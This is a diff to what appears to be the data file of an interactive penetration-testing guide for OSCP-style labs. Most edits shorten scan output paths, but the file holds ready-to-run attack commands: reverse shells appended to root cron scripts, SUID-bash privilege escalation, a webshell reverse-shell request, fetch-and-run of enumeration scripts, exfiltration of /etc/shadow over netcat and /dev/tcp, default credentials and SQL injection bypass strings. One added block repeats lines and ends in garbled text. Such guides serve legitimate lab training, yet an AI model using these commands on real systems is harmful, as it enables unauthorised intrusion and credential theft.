@@ -100,8 +100,8 @@ ping -c 1 $ip | grep ttl
 # TTL ~128 = Windows  /  TTL ~64 = Linux
 
 # -- Feed nmap XML to searchsploit ---------------------
-nmap -sV -oX scans/nmap.xml $ip
-searchsploit --nmap scans/nmap.xml`,
+nmap -sV -oX nmap.xml $ip
+searchsploit --nmap nmap.xml`,
     warn: "Unknown ports with banners are often the intended path. If nmap shows unrecognized service, banner grab manually and google the string. luminateOK = WiFi Mouse / Remote Mouse — searchsploit it.",
     choices: [
       { label: "Got versions — check danger reference", next: "version_ref" },
@@ -156,7 +156,7 @@ searchsploit openssh 7.2
 searchsploit samba 3.0
 searchsploit apache 2.4
 searchsploit apache | grep -v '/dos/'
-searchsploit --nmap scans/nmap.xml
+searchsploit --nmap nmap.xml
 searchsploit -m <path/to/exploit>
 searchsploit -x <path/to/exploit>`,
     warn: "Always read the exploit before running — check target IP/port variables and Python version. A wrong IP in a buffer overflow crashes the target.",
@@ -394,7 +394,7 @@ cat live_hosts.txt`,
     cmd: `nmap -iL live_hosts.txt -p- --min-rate 5000 -T4 -oG mass_scan.txt
 grep "open" mass_scan.txt
 
-rustscan -a live_hosts.txt -- -sC -sV -oN scans/rustscan.txt
+rustscan -a live_hosts.txt -- -sC -sV -oN rustscan.txt
 
 grep -E "80|443|445|22|3389|5985|8080|1433|3306" mass_scan.txt`,
     warn: null,
@@ -542,8 +542,8 @@ sort -u pivot_hosts.txt > internal_live.txt`,
     phase: "PIVOT",
     title: "Port Scan Through Tunnel",
     body: "Ligolo: treat like a direct connection. Proxychains: -sT required, lower rate. Never -sS through SOCKS.",
-    cmd: `nmap -p- --min-rate 2000 -T3 172.16.50.5 -oN scans/pivot_allports.txt
-nmap -p <PORTS> -sC -sV 172.16.50.5 -oN scans/pivot_targeted.txt
+    cmd: `nmap -p- --min-rate 2000 -T3 172.16.50.5 -oN pivot_allports.txt
+nmap -p <PORTS> -sC -sV 172.16.50.5 -oN pivot_targeted.txt
 
 proxychains nmap -sT -p 80,443,445,22,3389,5985,1433,3306 \\
   172.16.50.5 --open -T2
@@ -551,7 +551,7 @@ proxychains curl -sv http://172.16.50.5
 
 for host in $(cat internal_live.txt); do
   nmap -p 80,443,445,22,3389,5985,8080 \\
-    --open $host -oN scans/pivot_$host.txt
+    --open $host -oN pivot_$host.txt
 done`,
     warn: "Never -sS through proxychains. Always -sT.",
     choices: [
@@ -600,7 +600,17 @@ nmap -p <PORT> -sC -sV --version-intensity 9 $ip
 # 8080/8443/8009 — Tomcat, JBoss, GlassFish
 # 9200/9300     — Elasticsearch
 # 6379          — Redis
+# Common high-port services:
+# 8080/8443/8009 — Tomcat, JBoss, GlassFish
+# 9200/9300     — Elasticsearch
+# 6379          — Redis
 # 27017         — MongoDB
+# 17001         — MS .NET Remoting (SmarterMail RCE — CVE-2019-7214)
+# GoAhead-Webs  — Embedded/industrial mgmt software → old CVEs → searchsploit
+#                 HP Power Manager: admin:admin → buffer overflow → SYSTEM
+# HP Power Mgr  — port 80, GoAhead WebServer, admin:admin, MSF exploit
+# 9998          — SmarterMail web UI (check version here)
+# NOTE: .NET remoting exploit port ≠ web UI port — use remoting portngoDB
 # 1433          — MSSQL
 # 1099          — Java RMI
 # 5432          — PostgreSQL
@@ -1330,7 +1340,7 @@ Open Ports: [list]
 ## Evidence
 - Screenshot: nmap full scan output
 - Screenshot: service version banner
-- File: ~/results/$ip/scans/full.txt`,
+- File: ~/results/$ip/full.txt`,
     warn: "Version numbers matter — 'Apache on port 80' fails. 'Apache 2.4.49 on port 80, CVE-2021-41773 confirmed' passes.",
     choices: [
       { label: "TA0001 — Initial Access", next: "doc_initial_access" },
@@ -2856,16 +2866,16 @@ POST /api/profile
     body: "Run all 65535 ports in the background while you start UDP in parallel. Never skip this — services on high ports get people caught out.",
     cmd: `# -- Rustscan (faster — labs) --------------------------
 ulimit -n 5000
-rustscan -a $ip --ulimit 5000 -- -sV -sC -oN scans/targeted.txt
+rustscan -a $ip --ulimit 5000 -- -sV -sC -oN targeted.txt
 # Scans all ports in seconds, hands open ports to nmap automatically
 # The -- passes remaining args directly to nmap
 
 # -- Nmap (exam-safe, always works) --------------------
 # Full TCP (background it)
-nmap -p- --min-rate 5000 -T4 $ip -oN scans/allports.txt
+nmap -p- --min-rate 5000 -T4 $ip -oN allports.txt
 
 # UDP top 20 (background)
-sudo nmap -sU --top-ports 20 $ip -oN scans/udp.txt &
+sudo nmap -sU --top-ports 20 $ip -oN udp.txt &
 
 # HTTP methods check while you wait
 nmap -p80,443 --script=http-methods $ip \\
@@ -2881,52 +2891,52 @@ nmap -p80,443 --script=http-methods $ip \\
     title: "Targeted Service Scan",
     body: "Run scripts and version detection only on discovered ports. This is your core recon. Read every line of output. Then run per-service NSE for each open port.",
     cmd: `# -- Step 1: targeted scan on open ports ---------------
-nmap -p <PORTS> -sC -sV -O $ip -oN scans/targeted.txt
+nmap -p <PORTS> -sC -sV -O $ip -oN targeted.txt
 
 # -- Step 2: per-service NSE (run only for open ports) --
 
 # HTTP / HTTPS (80, 443, 8080, 8443)
 nmap -Pn -sV -p 80,443 \
   "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" \
-  -oN scans/nse_http.txt $ip
+  -oN nse_http.txt $ip
 
 # SMB (445)
 nmap -Pn -sV -p 445 \
   "--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" \
-  --script-args=unsafe=1 -oN scans/nse_smb.txt $ip
+  --script-args=unsafe=1 -oN nse_smb.txt $ip
 
 # FTP (21)
 nmap -Pn -sV -p 21 \
   --script=banner,ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor \
-  -oN scans/nse_ftp.txt $ip
+  -oN nse_ftp.txt $ip
 
 # SSH (22)
 nmap -Pn -sV -p 22 \
   --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods \
-  -oN scans/nse_ssh.txt $ip
+  -oN nse_ssh.txt $ip
 
 # RPC (111)
 nmap -Pn -sV -p 111 \
   --script=banner,msrpc-enum,rpc-grind,rpcinfo \
-  -oN scans/nse_rpc.txt $ip
+  -oN nse_rpc.txt $ip
 
 # SMTP (25)
 nmap -Pn -sV -p 25 \
   "--script=banner,(smtp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" \
-  -oN scans/nse_smtp.txt $ip
+  -oN nse_smtp.txt $ip
 
 # DNS (53 UDP)
 sudo nmap -Pn -sU -sV -p 53 \
   "--script=banner,(dns* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" \
-  -oN scans/nse_dns.txt $ip
+  -oN nse_dns.txt $ip
 
 # SNMP (161 UDP)
 sudo nmap -sU -sV -p 161 \
   --script=snmp-info,snmp-sysdescr,snmp-processes,snmp-interfaces \
-  -oN scans/nse_snmp.txt $ip
+  -oN nse_snmp.txt $ip
 
 # -- Step 3: vuln scan after reading service output -----
-nmap -sV -p <PORTS> --script vuln $ip -oN scans/nse_vuln.txt`,
+nmap -sV -p <PORTS> --script vuln $ip -oN nse_vuln.txt`,
     warn: "Run per-service NSE only for ports that are actually open. The vuln category is noisy and slow — save it for after you have read the service output and identified candidates. The smb* scripts with unsafe=1 can crash unstable targets.",
     choices: [
       { label: "Help me read and prioritize this output", next: "analyze_output" },
@@ -2953,7 +2963,7 @@ nmap -sV -p <PORTS> --script vuln $ip -oN scans/nse_vuln.txt`,
     title: "Read the Scan — Before You Attack",
     body: "Most people skip this step. They see port 80 and jump to web_enum. Slow down. Every line of nmap output is signal. Read it as a complete picture before you choose your attack path.",
     cmd: `# Print your targeted scan output
-cat scans/targeted.txt
+cat targeted.txt
 
 # -- WHAT TO LOOK FOR ---------------------
 # 1. SERVICE VERSIONS — are any outdated?
@@ -3102,11 +3112,11 @@ searchsploit -x [exploit/path]   # read before running
     cmd: `# -- WHEN NMAP OUTPUT LOOKS THIN ----------
 
 # 1. DID YOU SCAN ALL PORTS?
-nmap -p- --min-rate 5000 $ip -oN scans/allports.txt
+nmap -p- --min-rate 5000 $ip -oN allports.txt
 # Services on high ports (8080, 8443, 8888, 9090, 10000) are common
 
 # 2. UDP — HAVE YOU CHECKED IT?
-sudo nmap -sU --top-ports 100 $ip -oN scans/udp.txt
+sudo nmap -sU --top-ports 100 $ip -oN udp.txt
 # SNMP (161), TFTP (69), DNS (53) often only on UDP
 # SNMP especially — community string "public" = info dump
 
@@ -3223,39 +3233,39 @@ enum4linux-ng $ip
 # feroxbuster recurses into found dirs automatically
 feroxbuster -u http://$ip \\
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
-  -d 3 --extract-links -o scans/ferox_dirs_raft.txt
+  -d 3 --extract-links -o ferox_dirs_raft.txt
 
 # HTTPS target (self-signed cert)
 feroxbuster -u https://$ip -k \\
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
-  -d 3 --extract-links -o scans/ferox_dirs_raft.txt
+  -d 3 --extract-links -o ferox_dirs_raft.txt
 
 # Wildcard filter — if box returns 200 for everything
 # First get a wildcard URL to filter against:
 feroxbuster -u http://$ip \\
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
   --filter-similar-to http://$ip/doesnotexist123 \\
-  -d 3 -o scans/ferox_dirs_raft.txt
+  -d 3 -o ferox_dirs_raft.txt
 
 # ── PASS 2: FILES ─────────────────────────────────────
 # raft-medium-files = actual filenames WITH extensions
 # (config.php, index.bak, login.html etc)
 feroxbuster -u http://$ip \\
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \\
-  -d 3 -o scans/ferox_files.txt
+  -d 3 -o ferox_files.txt
 
 # ── PASS 3: TARGETED EXTENSIONS ON KNOWN DIR ─────────
 # once Pass 1 finds /admin, run extensions against it specifically
 feroxbuster -u http://$ip/FOUND_DIR \\
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \\
-  -x php,html,txt,bak,old,zip -d 2 -o scans/ferox_ext.txt
+  -x php,html,txt,bak,old,zip -d 2 -o ferox_ext.txt
 
 # ── PASS 4: ESCALATE — if raft found nothing ──────────
 # directory-list-2.3-medium is 7x larger, pentest-derived
 # finds CTF paths, legacy app dirs, obscure endpoints
 feroxbuster -u http://$ip \\
   -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\
-  -d 3 -o scans/ferox_dirs_dirbuster.txt
+  -d 3 -o ferox_dirs_dirbuster.txt
 
 # ── VHOST FUZZING ─────────────────────────────────────
 # Virtual host enum — same IP, different Host header = different app
@@ -3266,7 +3276,7 @@ curl -s -H "Host: doesnotexist.example.com" http://$ip -o /dev/null -w "%{size_d
 ffuf -u http://$ip \\
   -H "Host: FUZZ.$domain" \\
   -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
-  -fs BASELINE_SIZE -o scans/ffuf_vhosts.txt
+  -fs BASELINE_SIZE -o ffuf_vhosts.txt
 
 # If domain unknown — try common patterns
 ffuf -u http://$ip \\
@@ -3283,24 +3293,24 @@ gobuster vhost -u http://$ip \\
 echo "$ip found.domain.com" | sudo tee -a /etc/hosts
 feroxbuster -u http://found.domain.com \\
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
-  -d 3 -o scans/ferox_vhost.txt
+  -d 3 -o ferox_vhost.txt
 
 # ── GOBUSTER — fast single-pass fallback ──────────────
 gobuster dir -u http://$ip \\
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
-  -t 40 -o scans/gobuster_dirs.txt
+  -t 40 -o gobuster_dirs.txt
 gobuster dir -u http://$ip \\
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \\
-  -t 40 -o scans/gobuster_files.txt
+  -t 40 -o gobuster_files.txt
 
 # ── FFUF — fine-grained control ───────────────────────
 curl http://$ip/doesnotexist123 -s -o /dev/null -w "%{size_download}\n"
 ffuf -u http://$ip/FUZZ \\
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
-  -mc 200,301,302,403 -fs BASELINE_SIZE -o scans/ffuf_dirs.txt
+  -mc 200,301,302,403 -fs BASELINE_SIZE -o ffuf_dirs.txt
 ffuf -u http://$ip/FUZZ \\
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \\
-  -mc 200,301,302 -fs BASELINE_SIZE -o scans/ffuf_files.txt
+  -mc 200,301,302 -fs BASELINE_SIZE -o ffuf_files.txt
 # files in a known dir:
 ffuf -u http://$ip/FOUND_DIR/FUZZ \\
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \\
@@ -3312,7 +3322,7 @@ curl -sv http://$ip 2>&1 | grep -i "server\\|x-powered\\|set-cookie\\|location"
 curl http://$ip/robots.txt
 curl http://$ip/sitemap.xml
 # nikto is slow and noisy — background it or run last
-nikto -h http://$ip -o scans/nikto.txt &`,
+nikto -h http://$ip -o nikto.txt &`,
     warn: "feroxbuster recurses automatically — no trailing slash or /FUZZ needed. If every path returns 200, use --filter-similar-to with a known-bad URL to filter wildcards. If raft finds nothing escalate to directory-list-2.3-medium — OSCP boxes frequently hide paths there. Vhost fuzzing is often the hidden path — always check when you have a domain name or SSL cert CN.",
     choices: [
       { label: "Found WordPress", next: "wordpress" },
@@ -3341,7 +3351,7 @@ nikto -h http://$ip -o scans/nikto.txt &`,
   -t 30
 
 ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \\
-  -u http://FUZZ.domain.org -o scans/subdomains.txt
+  -u http://FUZZ.domain.org -o subdomains.txt
 
 # Add to /etc/hosts
 echo "$ip sub.domain.org" >> /etc/hosts`,
@@ -3465,6 +3475,13 @@ curl "http://$ip/wp-content/themes/theme/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/
     cmd: `# Default creds to try first
 admin:admin  admin:password  admin:admin123
 root:root    guest:guest     test:test
+# Management consoles — try these too:
+# HP Power Manager: admin:admin (lab validated: Kevin)
+# Grafana:          admin:admin
+# Jenkins:          admin:password  or no password
+# Tomcat manager:   tomcat:tomcat  admin:admin
+# SNMP:             community string = public
+# Always try default BEFORE running any exploit
 
 # SQLi bypass
 ' OR 1=1--
@@ -4422,7 +4439,7 @@ curl -k "http://$ip/shell.php?cmd=id;hostname"
 # Step 1: dir brute to find app base
 feroxbuster -u http://$ip \\
   -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\
-  --depth 2 -o scans/ferox_dirs.txt
+  --depth 2 -o ferox_dirs.txt
 # Step 2: update base_url in exploit to found path
 # Step 3: some exploits require a local JPEG file
 #   Read exploit header -- it will specify the filename
@@ -4447,7 +4464,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread 
     title: "SMB Enumeration",
     body: "SMB is information-rich. Null session, guest access, share contents, user enumeration. EternalBlue check is mandatory.",
     cmd: `# ── BASIC ENUM ────────────────────────────────────────
-enum4linux-ng -A $ip | tee scans/smb_enum.txt
+enum4linux-ng -A $ip | tee smb_enum.txt
 nmap -p 445 -sV $ip
 
 # ── NULL / GUEST SESSION ──────────────────────────────
@@ -4490,7 +4507,7 @@ nmap -p 445 --script smb-vuln-ms17-010 $ip
 nmap -p 445 --script smb-vuln-ms08-067 --script-args=unsafe=1 $ip
 nmap -Pn -sV -p 445 \\
   "--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" \\
-  --script-args=unsafe=1 -oN scans/nse_smb.txt $ip
+  --script-args=unsafe=1 -oN nse_smb.txt $ip
 
 # ── WITH CREDS ────────────────────────────────────────
 crackmapexec smb $ip -u user -p 'password' --shares
@@ -4724,7 +4741,30 @@ done`,
     phase: "RECON",
     title: "Other Services",
     body: "SNMP leaks configs and community strings. DNS zone transfers can reveal the whole network map. LDAP and RPC enumerate users without authentication.",
-    cmd: `# SNMP — community string brute + walk
+    cmd: `# ── GOAHEAD WEBSERVER — EMBEDDED/INDUSTRIAL SOFTWARE ──
+# nmap fingerprint: GoAhead-Webs or GoAhead WebServer
+# Signals embedded device, industrial control, or management software
+# Almost always old CVEs — searchsploit immediately
+# Common applications on GoAhead:
+# HP Power Manager  → default admin:admin → buffer overflow RCE
+# IP cameras, NAS, UPS management consoles
+# Lab validated: Kevin (PG Practice) — admin:admin → MSF → SYSTEM
+searchsploit hp power manager
+# msfconsole → search hp power manager → use → set rhosts/lhost/lport → run
+
+# ── .NET REMOTING (17001 / custom port) ──────────────
+# nmap labels this: "MS .NET Remoting services"
+# Vulnerable to deserialization attacks
+# Check searchsploit for the service running on it (e.g. SmarterMail)
+# CVE-2019-7214: SmarterMail < build 6985
+# Port in exploit = .NET remoting port (17001) NOT the web UI port (9998)
+# Exploit output is silent — feedback only via nc listener
+searchsploit smartermail
+# python3 49216.py  (edit HOST, PORT=17001, LHOST, LPORT)
+
+# ── SNMP — community string brute + walk
+# snmp-check dumps FULL process list — confirms what's actually running
+# Lab: ClamAV box — snmp-check confirmed clamav-milter + inetd before exploit
 onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt $ip
 snmpwalk -c public -v1 $ip
 snmp-check $ip
@@ -4813,7 +4853,7 @@ head -1000 /usr/share/wordlists/rockyou.txt >> custom.txt
 
 # ── SSH ───────────────────────────────────────────────
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\
-  ssh://$ip -t 4 -o scans/hydra_ssh.txt
+  ssh://$ip -t 4 -o hydra_ssh.txt
 # Single user
 hydra -l root -P /usr/share/wordlists/rockyou.txt \\
   ssh://$ip -t 4
@@ -5078,7 +5118,21 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o shel
     phase: "SHELL",
     title: "Shell Troubleshooting",
     body: "Shell not catching or dying immediately. Work through this systematically — the failure mode is almost always one of five things.",
-    cmd: `# -- DIAGNOSTIC CHECKLIST -----------------
+    cmd: `# -- BIND SHELL VS REVERSE SHELL ──────────
+# Reverse shell: target connects BACK to you (nc -nlvp PORT on Kali)
+# Bind shell:    target LISTENS, you connect TO it (nc $ip PORT)
+# Some exploits (e.g. CVE-2007-4560 clamav-milter) open bind shells
+# If exploit fires but nothing hits your listener — try nc $ip <port>
+# Lab: ClamAV — exploit opened port 31337 on target, no listener needed
+
+# -- SCRIPT INTERPRETER ISSUES ─────────────
+# No shebang line = bash tries to run it = silent failure
+# perl scripts: always call  perl script.pl  not  ./script.pl
+# python scripts: python3 script.py
+# ruby scripts: ruby script.rb
+# Old boxes may not have python3 — try python for PTY upgrade
+
+# -- DIAGNOSTIC CHECKLIST -----------------
 
 # 1. CAN THE TARGET REACH YOU?
 # On target:
@@ -5317,6 +5371,13 @@ wget http://$lhost/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh
 /tmp/lp.sh | tee /tmp/linpeas_out.txt &
 # or in memory: curl http://$lhost/linpeas.sh | bash
 
+# LinEnum — scripted local Linux enumeration
+# github.com/rebootuser/LinEnum
+wget http://$lhost/LinEnum.sh -O /tmp/le.sh && chmod +x /tmp/le.sh
+/tmp/le.sh -t | tee /tmp/linenum_out.txt &
+# -t = thorough mode — slower but more checks
+# Good complement to LinPEAS — catches different things
+
 # unix-privesc-check
 ./unix-privesc-check standard 2>/dev/null | tee /tmp/upc_out.txt &
 
@@ -5410,6 +5471,16 @@ cat /etc/fstab
 mount
 lsblk
 # Unmounted partitions = may contain creds/data
+
+# ── /PROC FILESYSTEM — PROCESS INSPECTION ───────────
+# Kernel exposes all processes under /proc
+# Run process in background to get PID:
+sleep 1000 &   # → [1] 118168
+ls /proc/118168              # everything kernel knows about it
+cat /proc/118168/cmdline     # exact command + args
+grep -i uid /proc/118168/status
+# Uid: 1000 1000 1000 1000 = real/effective/saved/fs UID
+# If effective UID (col 2) = 0 = running as root
 
 # ── STEP 15: KERNEL MODULES ──────────────────────────
 lsmod
@@ -5828,9 +5899,25 @@ grep "CRON" /var/log/syslog | tail -20
 
 # ── PSPY — WATCH WITHOUT ROOT ────────────────────────
 # Download: github.com/DominicBreuker/pspy
-wget http://$lhost/pspy64 -O /tmp/pspy64
+wget http://$lhost/pspy64 -O /tmp/pspy64   # 64-bit
+wget http://$lhost/pspy32 -O /tmp/pspy32   # 32-bit (match arch)
 chmod +x /tmp/pspy64 && /tmp/pspy64
-# Watch for UID=0 processes running scripts
+
+# Reading output — look for UID=0:
+# CMD: UID=0 PID=121 | /bin/sh -c /var/archives/archive.sh
+# CMD: UID=0 PID=122 | /bin/bash /var/archives/archive.sh
+#   → root running archive.sh every minute
+#   → ls -la /var/archives/archive.sh
+#   → if world-writable: echo "chmod u+s /bin/bash" >> /var/archives/archive.sh
+#   → wait 1 min → /bin/bash -p → root
+
+# Filter to just root processes:
+/tmp/pspy64 | grep "UID=0"
+
+# Also watch for:
+# Creds in args: sshpass -p, mysql -p, curl -u
+# Scripts without full path = PATH hijack
+# Temp files in /tmp = race condition
 
 # ── CHECK SCRIPT PERMISSIONS ──────────────────────────
 # Once you find a script run by root:
@@ -5839,20 +5926,21 @@ ls -la /home/joe/.scripts/user_backups.sh
 cat /home/joe/.scripts/user_backups.sh
 
 # ── EXPLOIT — APPEND REVERSE SHELL ───────────────────
-# Method 1: reverse shell
+# Method 1: SUID bash (cleanest — no listener needed)
+# Lab validated: OffSec capstone
+echo "chmod u+s /bin/bash" >> /path/to/script.sh
+# Wait up to 1 minute for cron to fire
+ls -la /bin/bash   # watch for s bit: -rwsr-xr-x
+/bin/bash -p       # -p preserves effective UID = root shell
+# bash-5.1# whoami → root
+
+# Method 2: reverse shell
 echo "" >> /path/to/script.sh
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost 443 >/tmp/f" >> /path/to/script.sh
 
-# Method 2: add SUID to bash
-echo "chmod +s /bin/bash" >> /path/to/script.sh
-# Wait for execution then:
-/bin/bash -p
-# bash-5.0# id — euid=0(root)
-
 # Method 3: copy bash with SUID
 echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /path/to/script.sh
-# Wait then:
-/tmp/rootbash -p
+# Wait then: /tmp/rootbash -p
 
 # ── LISTENER ON KALI ─────────────────────────────────
 nc -nlvp 443
@@ -6057,13 +6145,44 @@ gcc exploit.c -o exploit
 file exploit   # verify ELF 64-bit if target is x64
 ./exploit
 
-# ── COMPILE ON KALI (cross-compile for target arch) ──
-# x64 target:
-gcc -m64 exploit.c -o exploit
-# x86 target:
-gcc -m32 exploit.c -o exploit
-# Static (avoids library version issues):
-gcc -static exploit.c -o exploit
+# ── COMPILE ON KALI (may fail — glibc version mismatch) ──
+# gcc -m32/-m64 gets arch right but libs may differ
+# Error: /lib/x86_64-linux-gnu/libc.so.6: version GLIBC_2.34 not found
+# = compiled against newer glibc than target has
+# Solution: use Docker to match target environment exactly
+
+# ── DOCKER — MATCH TARGET ENVIRONMENT (best method) ──
+# Install once on Kali:
+sudo apt-get install docker.io
+sudo systemctl start docker && sudo systemctl enable docker
+sudo usermod -aG docker $USER
+newgrp docker   # apply group without logout
+
+# Pull matching OS image
+docker pull ubuntu:16.04   # match target distro + version
+
+# Run container with current dir mounted, compile inside
+sudo docker run --rm -it -v "$PWD":/work -w /work ubuntu:16.04 bash
+# Inside container:
+apt-get update && apt-get install -y gcc build-essential
+gcc exploit.c -o exploit
+exit
+# Binary now compiled against Ubuntu 16 libs = matches target
+
+# Transfer compiled binary to target
+scp exploit user@$ip:/tmp/
+# On target:
+chmod +x /tmp/exploit && /tmp/exploit
+
+# ── WORKFLOW: KERNEL VERSION → SEARCHSPLOIT → DOCKER COMPILE ─
+# 1. cat /etc/issue && cat /etc/*release  (get distro)
+# 2. uname -r                              (get kernel)
+# 3. arch                                  (get architecture)
+# 4. searchsploit linux kernel ubuntu 16 local privilege escalation | grep "4." | grep -v "< 4.4.0"
+# 5. head -20 exploit.c                    (read compile instructions)
+# 6. rename to match: mv 45010.c cve-2017-16995.c
+# 7. docker compile matching distro
+# 8. scp to target → run
 
 # ── READ EXPLOIT COMPILE INSTRUCTIONS FIRST ──────────
 # Module 18.4.3: always read the first 20 lines
@@ -8169,6 +8288,13 @@ curl --upload-file /etc/passwd http://$lhost/passwd
 # Attacker: nc -nlvp 4444 > loot.txt
 nc $lhost 4444 < /tmp/loot.txt
 cat /etc/shadow | nc $lhost 4444
+
+# Exfil linpeas output — no python server on target needed
+# Attacker:
+nc -nlvp 80 > linout.txt
+# Target:
+cat linout.txt > /dev/tcp/$lhost/80
+# Safe — no listening port opened on target
 
 # SCP pull from Kali (if SSH available on target)
 scp user@$ip:/etc/shadow ~/shadow
